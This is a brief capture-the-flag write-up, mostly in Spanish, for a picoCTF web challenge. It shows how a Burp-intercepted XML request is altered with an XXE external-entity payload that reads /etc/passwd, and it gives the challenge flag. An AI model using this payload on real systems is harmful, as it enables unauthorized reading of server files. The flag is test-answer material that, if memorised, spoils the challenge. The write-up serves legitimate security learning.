## Descripcion
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
## Solucion
Usar foxyproxy con burp, dentro de burp hice: 

```html
<?xml version="1.0" encoding="UTF-8"?>
	<data>
		<ID>
			2
		</ID>
	</data>
```

Donde ahora se puede realizar un ataque reemplazando la etiqueta xml con lo siguiente:

```html
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

Y realizar el ataque con la siguiente petición:

```html
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
	<data>
		<ID>
			&xxe;
		</ID>
	</data>
```

flag:

picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}
## Notas adicionales
## Referencias
